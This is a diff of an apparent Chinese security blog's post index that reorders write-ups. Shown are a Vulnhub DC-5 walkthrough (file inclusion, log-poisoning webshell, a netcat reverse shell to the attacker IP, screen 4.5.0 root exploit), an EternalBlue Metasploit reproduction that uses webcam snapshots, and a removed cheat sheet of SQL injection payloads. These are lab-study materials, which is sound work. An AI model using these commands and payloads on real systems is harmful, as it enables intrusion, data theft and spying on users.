@@ -921,6 +921,137 @@ counts!!!).</p>
       </tags>
   </entry>
   <entry>
+    <title>Vulnhub-DC-5渗透学习</title>
+    <url>/2022/07/07/Vulnhub-DC-5/</url>
+    <content><![CDATA[<h1 id="一环境搭建">一、环境搭建</h1>
+<blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-5：192.168.8.122</p>
+</blockquote>
+<h1 id="二信息收集">二、信息收集</h1>
+<p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/1.png"></p>
+<p>扫描目标端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.122</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/2.png"></p>
+<p>开放了80端口，那就访问看看</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/3.png"></p>
+<p>看起来没什么特别的，只是一些静态页面</p>
+<p>指纹识别一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.122:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/4.png"></p>
+<p>感觉只是一个简单的页面</p>
+<p>在网站里四处看了看，发现Contact里可以产生交互</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/5.png"></p>
+<p>随便输入一些内容试试</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/6.png"></p>
+<p>发现我们写入的内容都进入了URL，并且跳转到了thankyou.php里</p>
+<p>好像没有什么很明显的利用点，那就扫一下后台看看有无可以利用的文件吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.122</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/7.png"></p>
+<p>似乎什么都没有，换一个字典更大的dirsearch来试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.8.122</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/8.png"></p>
+<h1 id="三实战">三、实战</h1>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>扫目录后发现有个在网页里没见过的footer.php文件</p>
+<p>访问一下</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/9.png"></p>
+<p>发现就是之前页面下面的Copyright</p>
+<p>还不知道有什么用，抓数据包看看</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/10.png"></p>
+<p>但数据包并没有什么特殊的，但是我记得在网页上的时候还是2020，现在变成了2017</p>
+<p>再测试几次，发现刷新的时候这个年份会产生变化</p>
+<p>再回到刚刚的页面中，无论怎么刷新它也不会变化</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/11.png"></p>
+<p>经过测试，只有在thankyou.php这个页面里刷新的时候它才会变化</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/12.png"></p>
+<p>怀疑有文件包含，在thankyou.php里包含了footer.php文件</p>
+<p>抓包爆破一下它的文件包含的参数</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/13.png"></p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/14.png"></p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/15.png"></p>
+<p>成功爆破出文件包含的参数</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>有了文件包含，我们想要查看任何已知路径的文件都可以做到，但要想拿到shell，那就得日志包含了</p>
+<p>在之前的指纹识别里能知道这个页面的Web服务器是Nginx，那直接网上找一找就能知道日志路径的位置了</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/16.png"></p>
+<p>查看一下看看对不对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.122/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/17.png"></p>
+<p>成功访问到日志，那接下来就是写入一句话再蚁剑连接就行了</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/18.png"></p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/19.png"></p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/20.png"></p>
+<p>成功连接</p>
+<h2 id="反弹shell">反弹shell</h2>
+<p>为了后面的操作更方便，先来反弹一下shell吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p>然后在蚁剑上打开终端</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/21.png"></p>
+<p>成功反弹shell后，利用python创建一个交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/22.png"></p>
+<h2 id="提权">提权</h2>
+<p>现在来看看如何提权</p>
+<p>SUID提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>免密的有root权限的文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/23.png"></p>
+<p>发现有一个很特别的东西，去看看它有没有可以利用的漏洞</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/24.png"></p>
+<p>发现存在一个漏洞可以利用</p>
+<p>打开看看如何使用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x linux/local/41154.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/25.png"></p>
+<p>里面大致有三部分，我框起来的是两部分，把这两部分删掉就是最后一部分</p>
+<ol type="1">
+<li><p>首先是第一部分，新建一个C文件，并写入第一部分的C语言内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi libhax.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/26.png"></p>
+<p>然后根据它的步骤把这个C文件编译成so文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/27.png"></p>
+<p>然后下面这个是用来删除刚刚新建的C文件的，可以执行也可以不执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f libhax.c</span><br></pre></td></tr></table></figure></li>
+<li><p>第二部分，同样新建一个C文件并写入C代码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi rootshell.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/28.png"></p>
+<p>然后编译</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/29.png"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f rootshell.c</span><br></pre></td></tr></table></figure></li>
+<li><p>最后一部分把前面两部分的删掉后另存进一个sh文件中就行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi run.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/30.png"></p></li>
+</ol>
+<p>然后把文件从kali复制出来，再通过蚁剑上传到<code>/tmp</code>目录下</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/31.png"></p>
+<p>然后在终端里给<code>sh</code>文件赋予可执行的权限，然后再执行<code>run.sh</code>文件就能提权成功</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x run.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/07/Vulnhub-DC-5/32.png"></p>
+<p>成功找到flag</p>
+<p><img src="/2022/07/07/Vulnhub-DC-5/33.png"></p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123612366?spm=1001.2014.3001.5502">dc-5
+靶机渗透学习</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1844735">Linux终端命令神器--Screen命令详解。助力Linux使用和管理</a></p>
+<p><a href="https://blog.csdn.net/weixin_43583637/article/details/102769923?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">Vulnhub靶机实战——DC-5</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>靶机</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vulnhub-DC-4渗透学习</title>
     <url>/2022/07/04/Vulnhub-DC-4/</url>
     <content><![CDATA[<h1 id="一环境搭建">一、环境搭建</h1>
@@ -1057,137 +1188,6 @@ i686</p>
 靶机渗透学习</a></p>
 <p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
 <p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>靶机</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnhub-DC-5渗透学习</title>
-    <url>/2022/07/07/Vulnhub-DC-5/</url>
-    <content><![CDATA[<h1 id="一环境搭建">一、环境搭建</h1>
-<blockquote>
-<p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC-5：192.168.8.122</p>
-</blockquote>
-<h1 id="二信息收集">二、信息收集</h1>
-<p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/1.png"></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.122</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/2.png"></p>
-<p>开放了80端口，那就访问看看</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/3.png"></p>
-<p>看起来没什么特别的，只是一些静态页面</p>
-<p>指纹识别一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.122:80</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/4.png"></p>
-<p>感觉只是一个简单的页面</p>
-<p>在网站里四处看了看，发现Contact里可以产生交互</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/5.png"></p>
-<p>随便输入一些内容试试</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/6.png"></p>
-<p>发现我们写入的内容都进入了URL，并且跳转到了thankyou.php里</p>
-<p>好像没有什么很明显的利用点，那就扫一下后台看看有无可以利用的文件吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.122</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/7.png"></p>
-<p>似乎什么都没有，换一个字典更大的dirsearch来试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://192.168.8.122</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/8.png"></p>
-<h1 id="三实战">三、实战</h1>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>扫目录后发现有个在网页里没见过的footer.php文件</p>
-<p>访问一下</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/9.png"></p>
-<p>发现就是之前页面下面的Copyright</p>
-<p>还不知道有什么用，抓数据包看看</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/10.png"></p>
-<p>但数据包并没有什么特殊的，但是我记得在网页上的时候还是2020，现在变成了2017</p>
-<p>再测试几次，发现刷新的时候这个年份会产生变化</p>
-<p>再回到刚刚的页面中，无论怎么刷新它也不会变化</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/11.png"></p>
-<p>经过测试，只有在thankyou.php这个页面里刷新的时候它才会变化</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/12.png"></p>
-<p>怀疑有文件包含，在thankyou.php里包含了footer.php文件</p>
-<p>抓包爆破一下它的文件包含的参数</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/13.png"></p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/14.png"></p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/15.png"></p>
-<p>成功爆破出文件包含的参数</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>有了文件包含，我们想要查看任何已知路径的文件都可以做到，但要想拿到shell，那就得日志包含了</p>
-<p>在之前的指纹识别里能知道这个页面的Web服务器是Nginx，那直接网上找一找就能知道日志路径的位置了</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/16.png"></p>
-<p>查看一下看看对不对</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.122/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/17.png"></p>
-<p>成功访问到日志，那接下来就是写入一句话再蚁剑连接就行了</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/18.png"></p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/19.png"></p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/20.png"></p>
-<p>成功连接</p>
-<h2 id="反弹shell">反弹shell</h2>
-<p>为了后面的操作更方便，先来反弹一下shell吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p>然后在蚁剑上打开终端</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.8.105 2222 -e /bin/bash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/21.png"></p>
-<p>成功反弹shell后，利用python创建一个交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/22.png"></p>
-<h2 id="提权">提权</h2>
-<p>现在来看看如何提权</p>
-<p>SUID提权</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>免密的有root权限的文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/23.png"></p>
-<p>发现有一个很特别的东西，去看看它有没有可以利用的漏洞</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/24.png"></p>
-<p>发现存在一个漏洞可以利用</p>
-<p>打开看看如何使用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit -x linux/local/41154.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/25.png"></p>
-<p>里面大致有三部分，我框起来的是两部分，把这两部分删掉就是最后一部分</p>
-<ol type="1">
-<li><p>首先是第一部分，新建一个C文件，并写入第一部分的C语言内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi libhax.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/26.png"></p>
-<p>然后根据它的步骤把这个C文件编译成so文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/27.png"></p>
-<p>然后下面这个是用来删除刚刚新建的C文件的，可以执行也可以不执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f libhax.c</span><br></pre></td></tr></table></figure></li>
-<li><p>第二部分，同样新建一个C文件并写入C代码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi rootshell.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/28.png"></p>
-<p>然后编译</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/29.png"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f rootshell.c</span><br></pre></td></tr></table></figure></li>
-<li><p>最后一部分把前面两部分的删掉后另存进一个sh文件中就行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi run.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/30.png"></p></li>
-</ol>
-<p>然后把文件从kali复制出来，再通过蚁剑上传到<code>/tmp</code>目录下</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/31.png"></p>
-<p>然后在终端里给<code>sh</code>文件赋予可执行的权限，然后再执行<code>run.sh</code>文件就能提权成功</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x run.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/07/Vulnhub-DC-5/32.png"></p>
-<p>成功找到flag</p>
-<p><img src="/2022/07/07/Vulnhub-DC-5/33.png"></p>
-<h1 id="参考文章">参考文章</h1>
-<p><a href="https://blog.csdn.net/qq_61237064/article/details/123612366?spm=1001.2014.3001.5502">dc-5
-靶机渗透学习</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/1844735">Linux终端命令神器--Screen命令详解。助力Linux使用和管理</a></p>
-<p><a href="https://blog.csdn.net/weixin_43583637/article/details/102769923?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">Vulnhub靶机实战——DC-5</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -2091,6 +2091,64 @@ i\right) }\right) -y^{\left( i\right) }\right)x_{j}^{(i)}\)</span></p>
       </tags>
   </entry>
   <entry>
+    <title>永恒之蓝复现</title>
+    <url>/2022/04/12/ms17-010/</url>
+    <content><![CDATA[<h1 id="一搭建测试环境">一、搭建测试环境</h1>
+<p>两台虚拟机</p>
+<ul>
+<li>kali linux（攻击机）ip：192.168.11.132</li>
+<li>Windows 7（被攻击机）ip：192.168.11.128</li>
+</ul>
+<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
+<h1 id="二扫描端口">二、扫描端口</h1>
+<p>使用nmap扫描端口查看是否开放445端口</p>
+<p><code>nmap 192.168.11.128</code></p>
+<p><img src="/2022/04/12/ms17-010/1.png"></p>
+<p>发现445端口开放</p>
+<h1 id="三使用metasploit工具">三、使用Metasploit工具</h1>
+<p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
+<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
+<p><img src="/2022/04/12/ms17-010/2.png"></p>
+<h2 id="检验是否有漏洞">1、检验是否有漏洞</h2>
+<p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p><code>show options</code>可以查看需要配置的东西</p>
+<p><img src="/2022/04/12/ms17-010/3.png"></p>
+<ol type="1">
+<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
+<li>配置端口：<code>set RPORT 445</code></li>
+</ol>
+<p><img src="/2022/04/12/ms17-010/4.png"></p>
+<p>配置好之后<code>run</code>即可</p>
+<p><img src="/2022/04/12/ms17-010/5.png"></p>
+<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
+<h2 id="攻击">2、攻击</h2>
+<p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p><code>show options</code>查看需要配置的内容</p>
+<p>同理，配置好ip和端口即可</p>
+<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
+<p><img src="/2022/04/12/ms17-010/6.png"></p>
+<h2 id="利用">3、利用</h2>
+<ol type="1">
+<li>使用<code>screenshot</code>可以截屏</li>
+<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
+<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
+<li><code>exit</code>退出</li>
+<li>...</li>
+</ol>
+<p>但在使用Windows shell的时候会发现有乱码</p>
+<p><img src="/2022/04/12/ms17-010/7.png"></p>
+<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
+<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>metasploit</title>
     <url>/2022/04/24/metasploit/</url>
     <content><![CDATA[<h1 id="一metasploit框架介绍">一、metasploit框架介绍</h1>
@@ -2224,64 +2282,6 @@ meterpreter</strong></p>
       <tags>
         <tag>渗透测试</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之蓝复现</title>
-    <url>/2022/04/12/ms17-010/</url>
-    <content><![CDATA[<h1 id="一搭建测试环境">一、搭建测试环境</h1>
-<p>两台虚拟机</p>
-<ul>
-<li>kali linux（攻击机）ip：192.168.11.132</li>
-<li>Windows 7（被攻击机）ip：192.168.11.128</li>
-</ul>
-<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
-<h1 id="二扫描端口">二、扫描端口</h1>
-<p>使用nmap扫描端口查看是否开放445端口</p>
-<p><code>nmap 192.168.11.128</code></p>
-<p><img src="/2022/04/12/ms17-010/1.png"></p>
-<p>发现445端口开放</p>
-<h1 id="三使用metasploit工具">三、使用Metasploit工具</h1>
-<p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
-<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
-<p><img src="/2022/04/12/ms17-010/2.png"></p>
-<h2 id="检验是否有漏洞">1、检验是否有漏洞</h2>
-<p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p><code>show options</code>可以查看需要配置的东西</p>
-<p><img src="/2022/04/12/ms17-010/3.png"></p>
-<ol type="1">
-<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
-<li>配置端口：<code>set RPORT 445</code></li>
-</ol>
-<p><img src="/2022/04/12/ms17-010/4.png"></p>
-<p>配置好之后<code>run</code>即可</p>
-<p><img src="/2022/04/12/ms17-010/5.png"></p>
-<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
-<h2 id="攻击">2、攻击</h2>
-<p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p><code>show options</code>查看需要配置的内容</p>
-<p>同理，配置好ip和端口即可</p>
-<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
-<p><img src="/2022/04/12/ms17-010/6.png"></p>
-<h2 id="利用">3、利用</h2>
-<ol type="1">
-<li>使用<code>screenshot</code>可以截屏</li>
-<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
-<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
-<li><code>exit</code>退出</li>
-<li>...</li>
-</ol>
-<p>但在使用Windows shell的时候会发现有乱码</p>
-<p><img src="/2022/04/12/ms17-010/7.png"></p>
-<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
-<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2866,62 +2866,6 @@ Orbiting，LEO）</strong>卫星。</p>
       </tags>
   </entry>
   <entry>
-    <title>sql注入</title>
-    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
-    <content><![CDATA[<h2 id="一报错盲注">一、报错盲注</h2>
-<h3 id="通过updatexml报错">1、通过updatexml报错</h3>
-<p>爆数据库名：<code>'and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
-<p>爆表名：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
-<p>爆列名：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
-<p>爆字段数据：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
-<h3 id="通过floor报错">2、通过floor报错</h3>
-<p><code>'and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<h3 id="通过extractvalue报错">3、通过extractvalue报错</h3>
-<p>爆数据库名：<code>'and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
-<p>爆表名：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>爆列名：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
-<p>爆字段数据：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
-<h2 id="二布尔盲注">二、布尔盲注</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
-<p><strong>注入流程</strong>：</p>
-<ul>
-<li>数据库长度</li>
-<li>数据库表的ascii</li>
-<li>数据库中表的个数</li>
-<li>数据库中其中一个表名的长度</li>
-<li>数据库中其中一个表名的ascii</li>
-<li>列名的数量</li>
-<li>列名的长度</li>
-<li>列名的ascii</li>
-<li>字段的数量</li>
-<li>字段内容的长度</li>
-<li>字段内容对应的ascii</li>
-</ul>
-<h2 id="三延时盲注">三、延时盲注</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
-<h2 id="四加解密注入">四、加解密注入</h2>
-<p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
-<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
-<h2 id="五二次注入">五、二次注入</h2>
-<ol type="1">
-<li><p>插入恶意数据</p>
-<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p></li>
-<li><p>引用恶意数据</p>
-<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p></li>
-</ol>
-<h2 id="六dns注入">六、DNS注入</h2>
-<p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
-<p>适合的网站：http://ceye.io</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL简单手工注入</title>
     <url>/2022/01/08/sql%E6%B3%A8%E5%85%A5/</url>
